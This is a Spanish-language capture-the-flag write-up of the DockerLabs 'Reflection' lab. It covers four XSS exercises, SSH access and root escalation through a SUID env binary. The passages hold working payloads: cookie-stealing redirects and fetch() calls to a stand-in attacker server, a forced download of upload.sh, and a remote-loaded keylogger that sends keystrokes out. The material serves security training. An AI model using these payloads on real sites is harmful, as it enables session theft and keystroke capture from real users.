---
title: Reflection
node_type: machine
platform: dockerlabs
difficulty: facil
os: linux
source_path: Maquinas De Dockerlabs/Maquinas Faciles/Reflection.md
needs_review: false
---

<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

# Reflection

## Resumen

Reflection introduce una ruta web con foco en XSS y enumeracion HTTP: despues de validar superficie y credenciales, la maquina aterriza en Linux y aprovecha permisos SUID para completar la escalada.

Fuente original: [Maquinas De Dockerlabs/Maquinas Faciles/Reflection.md](https://github.com/8andit0/BanditBox/blob/main/Maquinas%20De%20Dockerlabs/Maquinas%20Faciles/Reflection.md)

## Datos clave

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | facil |
| Sistema operativo | linux |
| Puertos detectados por texto | 22, 80 |
| Imagenes en fuente | 43 |
| Palabras en fuente | 2712 |
| Requiere revision | false |

## Resolucion paso a paso

>Hoy haremos una maquina bastante interesante creada por El Pinguino De Mario. En si, es una maquina fácil, pero es perfecta para ahondar en conceptos de XXS. Así que vamos pues :3

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606165606.png)

>Primero, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606165645.png)

>Vamos a verificar nuestra conexión con la maquina con una cuantas trazas ICMP, para ello, usaremos el comando "Ping":

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606165826.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)
1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Tres paquetes enviados, tres paquetes recibidos. Ya que comprobamos la conexión, realizamos un escaneo de puertos exhaustivo a la maquina con "Nmap":

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606170059.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sVC (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Vemos un servicio "OpenSSH 9.2" en el puerto 22, y un servicio "Apache 2.4.62" en el puerto 80. Vamos al laboratorio de Cross-site Scripting en el puerto 80, a ver con que nos encontramos.

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606170804.png)

>Parece que el laboratorio tiene 4 niveles, cada uno con un tipo de XXS diferente a explotar. Sin perder mas tiempo, vamos por el primer laboratorio (Reflected XSS):

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606171003.png)

>Vemos un panel donde podemos escribir cadenas, si probamos con una cadena cualquiera:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606171143.png)

>Vemos que al escribirla en el panel es reflejada en la zona de abajo.
>SIEMPRE que un valor Input (Introducido por el usuario) Es reflejado en alguna parte de la web, debemos testear un posible XXS, ya que es posible que el código JavaScript no este bien sanitizado, y permita la inclusión de cadenas y comandos Js o html, justo como en este caso. Para entenderlo a fondo, vamos al código fuente de la pagina, donde Mario nos ha dejado unas pistas sobre que sucede:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606172536.png)
_El parámetro se obtiene mediante GET para ser extraído con "window.location.search" y guardado en "userInput". El problema yace en las ultimas líneas, en donde se inserta lo que hay en "userInput" con la propiedad "innerHTML". Esta propiedad no solo muestra un texto, si no que si este tiene etiquetas JavaScript o HTML, lo interpreta._

>Como vemos, en vez de usar una propiedad de DOM segura como "textContent", la función "innerHTML" nos permite ejecutar comandos JavaScript o HTML en la web. Vamos a testear algunos Básicos:

```html
<h1 style="color:red">AQUI ESTAMOS INYECTANDO HTML</h1>
```
_Inyectamos una etiqueta estándar para definir un encabezado o titulo. Con el atributo "style=color:red" definimos el color rojito_
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606175100.png)
_El motor de renderizado de HTML lee las etiquetas "h1" e interpreta lo que hay en su interior como encabezado_

```html
<marquee>Estas son etiquetas HTML</marquee>
```
_marquee es una etiqueta HTML un tanto obsoleta que crea texto en movimiento_
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606175453.png)
_El navegador interpreta la etiqueta como un contenedor de texto desplazable_

```javascript
<a href="#" onclick="alert('XSS')">Haz click aqui :3</a>
```
_con la etiqueta HTML "a" formamos un enlace, y lo definimos en la pagina actual (Sin redirección) con "href=#". Con el evento "oneclick" al hacer click ejecutamos lo siguiente entre comillas (alert XSS) con JavaScript_
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606180203.png)
_Cuando el usuario hace click, el navegador interpreta y ejecuta el código Js de "oneclick"_

```javascript
<img src=x onerror="console.log('XSS funcionando')">
```
_Aquí modificamos un poco la lógica de la etiqueta "img". Primero cargamos un recurso de imagen invalido con "src=x", luego creamos el evento "onerror" que ejecutara lo siguiente con JavaScript en caso de error al cargar la imagen. "console.log" creara un log en la consola del navegador con lo que agreguemos en los paréntesis_
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606181338.png)
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250606181404.png)
_Abriendo la consola con F12, podemos ver el log "XSS Pwned"_

>Bien, sabemos que la pagina es vulnerable, en un XSS reflejado, por lo general lo realmente peligroso es que el apartado vulnerable este en la URL. Si en un caso hipotético la pagina manejara "Cookie sesión" podríamos intentar robar la cookie de sesión de un usuario al enviarle un URL infectado con un payload de robo de Cookie:

```javascript
<img src=x onerror="window.location='http://servidor_del_atacante/log.php?c='+document.cookie">
```
_Como este_

```javascript
<svg/onload="location.href='http://servidor_del_atacante/log.php?c='+document.cookie">
```
_O este_

```javascript
<a href="javascript:window.location='http://servidor_del_atacante/log.php?c='+document.cookie">Click</a>
```
O este

>Vamos ahora por un XXS Almacenado en el laboratorio 2:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250607171855.png)

>Vemos una interfaz un poco diferente. Si inyectamos una cadena, será almacenada en la web, y la tendremos en la zona de abajo:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250607172113.png)

>Cada inyección que hacemos es almacenada e hipotéticamente mostrada a cualquier otro usuario que visite la web, un buen ejemplo seria:

```javascript
<img src=x onerror="fetch('Servidor_del_atacante/coockie=' + document.coockie)">
```
_De esta manera igual que antes intentamos cargar un recurso de imagen inexistente, al no ser valido, la etiqueta "onerror" ejecutara la función de JavaScript fetch() que hará un petición http a nuestra ip atacante, concatenando la cookie del usuario victima_

>Para testear si funciona, nos montamos un un pequeño servidor http con Python:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250607174947.png)

>Insertamos el payload:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250607174247.png)

>El navegador solamente muestra un icono de imagen rota, ya que no existe el recurso de donde se intento obtener la imagen. Pero, si nos vamos a la terminal donde levantamos el servidor http:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250607175332.png)

>Vemos que recibimos una petición. Claro, la petición arroja un error porque la web no maneja cookies y somos nosotros mismos los que la hacemos. Pero, en teoría, si hubiera mas usuarios, cada vez que alguno ingrese al panel, seria victima de un robo de cookie (cookie hijacking) sin darse cuenta.
>En el código fuente de la pagina tenemos varias pistas sobre lo que genera la vulnerabilidad:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608171531.png)
_Igual que en el laboratorio 1, se usa la propiedad innerHTML, que es sumamente insegura al mostrar valores que ha introducido el usuario, ejecutando cualquier etiqueta HTML encontrada. Estos valores, tampoco son sanitizados de ninguna manera al ser insertados al DOM.
Haciendo un pequeño lineamiento de ejecución:_
1. _"messages.forEach((msg) => { ... })" recorre todos los mensaje que hemos introducido en el panel, que se encuentran en localStorage
2. _"const msgDiv = document.createElement("div");" crea una nueva etiqueta "div" para cada uno de los mensajes recorridos_
3. _"msgDiv.className = "message";" Aquí introducimos un clase CSS (Le da el estilo)_
4. _"msgDiv.innerHTML = msg;" Aquí es donde inyectamos el mensaje con la propiedad mas vulnerable_
5. _"messagesContainer.appendChild(msgDiv);" Aquí, por ultimo, insertamos en "div" en el DOM para cada mensaje_

>Para hacer un ejemplo mucho mas interesante, podemos forzar a un usuario que frecuente la pagina a descargar un archivo de nuestro servidor, creando un super payload:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608180029.png)

>Levantamos un servidor http con Python en el directorio donde tenemos nuestro super payload:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608180145.png)

>He inyectamos un payload que direccione al usuario victima a nuestra IP y al archivo infectado:

```html
<img src="x" onerror="
  window.location.href = 'http://IP:80/upload.sh';
">
```

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608180508.png)

>El payload queda almacenado en la web, y ahora siempre que un usuario ingrese a la pagina será direccionado a nuestro servidor y a nuestro archivo malicioso:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608180647.png)

>No estamos haciendo mucho daño con un payload así, pero, con ello ya se puede intuir lo peligroso que seria inyectar algo mas complejo y ofuscado en un lugar que almacena las entradas de usuario sin sanitizar.
>Ahora, vamos por el laboratorio de XSS con Dropdowns:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608235412.png)

>El menú cuenta con tres "Dropdowns" o "Menú desplegables" que nos permiten seleccionar distintos valores para cada uno, al enviar un valor, es reflejando en la zona baja de la web.
>Para este caso, vemos que la petición tiene los valores de los menú desplegables en la URL:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250608235811.png)

>Lo que quiere decir que podemos cambiarlos con total libertad desde allí (_Aunque en la web parecen no ser modificables_), O, operar mas cómodamente con burpsuite.

>Desde la URL (Para que se entienda mejor) vamos a testear un poco con algo sencillo:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004801.png)
_Modificamos la opcion1 por un encabezado entre etiquetas h1
![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004818.png)
_Vemos que la web SI que interpreta HTML_

>Ya que sabemos que es vulnerable, tal vez... Un keylogger sencillo:

```javascript
<img src=x onerror="s=document.createElement('script');s.src='//nuestra_ip/key.js';document.body.appendChild(s)">
```
1. _igual que en ejemplos anteriores, forzamos el evento "onerror" al cargar una imagen inexistente (Esto es para evitar usar directamente la etiqueta "script" que parece no funcionar)_
2. _Con "document.createElement('script')" estamos creando una etiqueta "script" en el DOM sin tener que inyectarla tradicionalmente._
3. _Con "s.src=//IP//archivo" definimos que la fuente del "script" que creamos antes será un archivo remoto que estará alojando en nuestro servidor (_Ya que inyectándolo dentro del payload no tuve muy buenos resultados :'( .  )
4. _Por ultimo, con "document.body.appendChild(s)" añadimos lo anterior al cuerpo HTML ejecutando el código que hay en key.js de manera automática y medio persistente (Seria mas efectivo en un XSS Almacenado).

>Claro, para que payload funcione, debemos crear el archivo "Key.js" en nuestro servidor, que será el que tendrá el código malicioso:

```javascript
document.onkeypress = e => fetch('http://TU-IP:8000/?k=' + e.key);
```
1. _Con document.onkeypress asignamos un evento en escucha que se ejecuta cada vez que alguien en la web presiona una tecla_
2. Con el resto del script, enviamos la petición HTTP a nuestro servidor concatenándole cada pulsación (e.key)

>Para hacer una pequeña prueba de concepto:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004011.png)
_Creamos el script key.js en nuestro servidor_

>Levantamos un servicio http con Python:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004055.png)

>Enviamos el payload:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004340.png)

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004407.png)
_El payload es enviado, en la web, solamente se vera un icono de imagen rota, al tratar de cargar una inexistente_

>Si revisamos las peticiones que han entrado a nuestro servidor con Python, nos encontramos con una petición GET al recurso /key.js:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004424.png)

>Lo interesante es, que si nos vamos a la web y oprimimos cualquier tecla, la recibiremos en nuestro servidor:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609004505.png)

>Claro, literalmente nos estamos infectando a nosotros mismos, pero, se entiende lo vulnerable que es la web y el alcance al que se podría llegar si hubieran mas usuarios usándola.
>Finalmente, llegamos al ultimo laboratorio, basado en parámetros GET:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609012814.png)

>En este caso explotamos un vector usual de XSS en parámetros de URL.
>Nos explican en el mismo laboratorio el nombre del parámetro y su uso "?data=". Todo valor que pasamos a aquel parámetro será reflejado en la parte baja de la pagina:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609125008.png)

>Testeamos desde la misma URL una inyección sencilla de HTML:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609130408.png)
_Igual que antes, generamos un error intencional en la obtención de una imagen, y con JavaScript insertamos el evento "onerror" para ejecutar su contenido_

>Desde la pestaña "inspector" (con F12) podemos ver que en los elementos del DOM (_Se puede entender como una representación dinámica del documento HTML de la web_) nuestro código se ejecuta como si fuera parte de la web:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609130653.png)

>Hay muchas mas maneras de explotar un XSS (XSS en headers HTTP, XSS en WebSockets, etc), pero en general, la dinámica es similar, tenemos un valor en la web que (ofuscado o visible) no esta lo suficientemente sanitizado, o es tratado y renderizado por funciones incorrectas en su fuente, dando así, la posibilidad de inyectar payloads HTML o JavaScript.

>Ya que tenemos los 4 laboratorios:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609132606.png)

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609132659.png)

>Nos entregan las claves de el servicio ssh. Vamos a probarlas he ingresar a la maquina:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609133144.png)

 >Haremos un tratamiento de la TTY para una shell mas interactiva y menos problemática, primero:

```bash
 script /dev/null -c bash
```
_Script solicita una PTY (Pseudo terminal) al kernel, luego, ejecuta en el proceso hijo que se crea, el comando que pasamos con la flag "-c", es decir una bash. Por ultimo, script no graba nada de la sesión al redirigirlo al /dev/null (Si no esta script disponible, puedes usar Python: python3 -c 'import pty; pty.spawn("/bin/bash")')._

>Ahora, con un CTRL+Z enviamos la Shell a segundo plano y desde nuestra terminal:

```bash
stty raw -echo; fg
```
1. _stty es la herramienta que nos ayudara a cambiar los parámetros de la terminal (eco, señales, etc.)
2. _raw es la flag que nos ayudara a desactivar el procesamiento de señales como CTRL+C (para que al hacerlo la shell no muera) o CTRL+Z (para no poner en segundo plano la shell por error)
3. _-echo Desactiva el echo del teclado, que nos puede dar problemas
4. _; fg (foreground) devuelve a primer plano nuestra querida Shell O.o

>Por ultimo vamos a establecer las variables de entorno correctas para una Shell totalmente funcional:

```bash
export TERM=xterm
export SHELL=/bin/bash
```
_Le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente. Y luego Establecemos /bin/bash como la Shell por defecto para que otras herramientas lo usen.

>Para escalar privilegios, primero listaremos los archivos SUID del sistema con el comando find:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609134022.png)
1. _Con el comando “find” Buscamos archivos
2. _Con “/” especificamos que sea desde el directorio raiz
3. _“-perm -4000” para especificar que queremos listar solamente archivos con el bit SUID
4. _“-type f” para solo mostrar archivos y no directorios
5. _“2>/dev/null” para enviar los errores al agujero negro de Linux (que no se muestren en pantalla)

>Nos encontramos con un binario muy conocido "/usr/bin/env", que nos permite escalar privilegios fácilmente.
>Env es un binario que puede ejecutar comandos de forma flexible, al ser SUID, SIEMPRE es ejecutado con los privilegios de su usuario propietario, que en este caso:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609134629.png)

>Es ROOT
>Así que bien, solo nos queda usarlo para ejecutar una terminal, que se ejecutara con los privilegios de root:

![Captura](https://raw.githubusercontent.com/8andit0/BanditBox/main/Attachments/Pasted%20image%2020250609134816.png)
_Con el archivo /usr/bin/env ejecutamos una Shell interactiva. Con el parámetro -p evitamos que /bin/sh ignore el bit SUID, es decir, lo obligamos a darnos una consola como ROOT.

>Finalmente, conquistamos la maquina :3


## Cadena de ataque detectada

- **Enumeration**: Apache, Connectivity check, HTTP, PHP, Port enumeration, SSH, Web enumeration
- **Post Exploitation**: Credential extraction, TTY stabilization
- **Privilege Escalation**: SUID abuse, SUID binary abuse


## Tecnicas utilizadas

- [Connectivity check](../../../techniques/connectivity-check.md)
- [Credential extraction](../../../techniques/credential-extraction.md)
- [Port enumeration](../../../techniques/port-enumeration.md)
- [SUID abuse](../../../techniques/suid-abuse.md)
- [TTY stabilization](../../../techniques/tty-stabilization.md)
- [Web enumeration](../../../techniques/web-enumeration.md)


## Herramientas utilizadas

- [Burp Suite](../../../tools/burp-suite.md)
- [find](../../../tools/find.md)
- [Nmap](../../../tools/nmap.md)
- [Ping](../../../tools/ping.md)
- [Python](../../../tools/python.md)
- [ssh](../../../tools/ssh.md)


## Servicios relacionados

- [Apache](../../../services/apache.md)
- [HTTP](../../../services/http.md)
- [PHP](../../../services/php.md)
- [SSH](../../../services/ssh.md)


## Vulnerabilidades relacionadas

- [SUID misconfiguration](../../../vulnerabilities/suid-misconfiguration.md)
- [Weak credentials](../../../vulnerabilities/weak-credentials.md)


## Metodos de escalada

- [SUID binary abuse](../../../privilege_methods/suid-binary-abuse.md)
